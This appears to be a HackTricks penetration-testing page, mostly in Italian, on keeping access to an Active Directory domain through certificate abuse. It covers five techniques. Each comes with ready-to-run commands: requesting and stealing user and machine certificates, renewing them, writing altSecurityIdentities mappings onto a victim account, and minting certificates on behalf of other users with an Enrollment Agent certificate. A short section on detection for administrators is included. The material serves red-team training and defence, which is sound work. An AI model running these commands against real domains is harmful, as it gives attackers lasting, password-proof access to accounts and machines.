# Persistenza account AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Questa è una breve sintesi dei capitoli sulla persistenza degli account dell'eccellente ricerca disponibile su [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprendere il furto di credenziali utente attive con i certificati – PERSIST1

In uno scenario in cui un certificato che consente l'autenticazione di dominio può essere richiesto da un utente, un attaccante ha l'opportunità di richiedere e rubare questo certificato per mantenere la persistenza su una rete. Per impostazione predefinita, il `User` template in Active Directory consente tali richieste, anche se a volte può essere disabilitato.

Usando [Certify](https://github.com/GhostPack/Certify) o [Certipy](https://github.com/ly4k/Certipy), puoi cercare template abilitati che consentono l'autenticazione client e poi richiederne uno:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Il potere di un certificato risiede nella sua capacità di autenticarsi come l'utente a cui appartiene, indipendentemente dalle modifiche della password, purché il certificato rimanga valido.

Puoi convertire PEM in PFX e usarlo per ottenere un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinata con altre tecniche (vedere le sezioni THEFT), certificate-based auth consente accesso persistente senza toccare LSASS e anche da contesti non elevati.

## Ottenere persistenza della macchina con certificati - PERSIST2

Se un attaccante ha privilegi elevati su un host, può richiedere un certificato per l'account macchina del sistema compromesso utilizzando il template predefinito `Machine`. Autenticarsi come la macchina abilita S4U2Self per i servizi locali e può fornire una persistenza duratura sull'host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Estendere la Persistence tramite il rinnovo dei certificati - PERSIST3

Abusare dei periodi di validità e rinnovo dei modelli di certificato permette a un attaccante di mantenere l'accesso a lungo termine. Se possiedi un certificato emesso in precedenza e la sua chiave privata, puoi rinnovarlo prima della scadenza per ottenere una credenziale nuova e di lunga durata senza lasciare ulteriori artefatti di richiesta associati all'account originale.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Suggerimento operativo: tieni traccia delle durate dei file PFX in possesso dell'attaccante e rinnovali in anticipo. Il rinnovo può inoltre fare in modo che i certificati aggiornati includano l'estensione moderna di mappatura SID, mantenendoli utilizzabili con regole di mappatura DC più restrittive (vedi sezione successiva).

## Inserire mappature esplicite di certificati (altSecurityIdentities) – PERSIST4

Se puoi scrivere all'attributo `altSecurityIdentities` di un account di destinazione, puoi mappare esplicitamente un certificato controllato dall'attaccante su quell'account. Questa persistenza sopravvive ai cambi di password e, utilizzando formati di mappatura robusti, rimane funzionale sotto l'applicazione più restrittiva delle regole del DC.

Flusso ad alto livello:

1. Ottieni o emetti un certificato client-auth che controlli (es., richiedi il template `User` per te stesso).
2. Estrai un identificatore robusto dal certificato (Issuer+Serial, SKI, oppure SHA1-PublicKey).
3. Aggiungi una mappatura esplicita sull'attributo `altSecurityIdentities` del principal vittima usando quell'identificatore.
4. Autenticati con il tuo certificato; il DC lo associa all'account vittima tramite la mappatura esplicita.

Esempio (PowerShell) usando una mappatura Issuer+Serial robusta:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Quindi autenticati con il tuo PFX. Certipy otterrà direttamente un TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Costruire mappature robuste di `altSecurityIdentities`

In pratica, le mappature **Issuer+Serial** e **SKI** sono i formati robusti più facili da costruire a partire da un certificato in possesso di un attaccante. Questo diventa rilevante dopo l'**11 febbraio 2025**, quando i DCs, per impostazione predefinita, passeranno a **Full Enforcement** e le mappature deboli non saranno più affidabili.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Note
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
- The mapping works on both **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist as that machine.
- The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
- Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.

Per approfondire le mappature esplicite deboli e i percorsi di attacco, vedere:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Flusso di abuso:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La revoca del certificato dell'agente o delle autorizzazioni del template è necessaria per rimuovere questa persistenza.

Note operative
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, quindi un attaccante in possesso di un Enrollment Agent PFX può emettere e successivamente rinnovare certificati leaf senza toccare nuovamente l'account target originale.
- Se il recupero del TGT tramite PKINIT non è possibile, il certificato on-behalf-of risultante è comunque utilizzabile per l'autenticazione Schannel con `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impatto sulla persistenza

Microsoft KB5014754 ha introdotto Strong Certificate Mapping Enforcement sui domain controller. Dall'11 febbraio 2025, i DC sono impostati di default su Full Enforcement, rifiutando mapping deboli/ambigui. Implicazioni pratiche:

- I certificati pre-2022 che non contengono l'estensione di mapping SID possono fallire nel mapping implicito quando i DC sono in Full Enforcement. Gli attaccanti possono mantenere l'accesso rinnovando i certificati tramite AD CS (per ottenere l'estensione SID) oppure inserendo un mapping esplicito forte in `altSecurityIdentities` (PERSIST4).
- I mapping espliciti che usano formati forti (Issuer+Serial, SKI, SHA1-PublicKey) continuano a funzionare. I formati deboli (Issuer/Subject, Subject-only, RFC822) possono essere bloccati e dovrebbero essere evitati per la persistenza.

Gli amministratori dovrebbero monitorare e generare allarmi su:
- Modifiche a `altSecurityIdentities` e emissione/rinnovi di Enrollment Agent e certificati utente.
- I log di emissione della CA per richieste on-behalf-of e pattern di rinnovo insoliti.

## Riferimenti

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
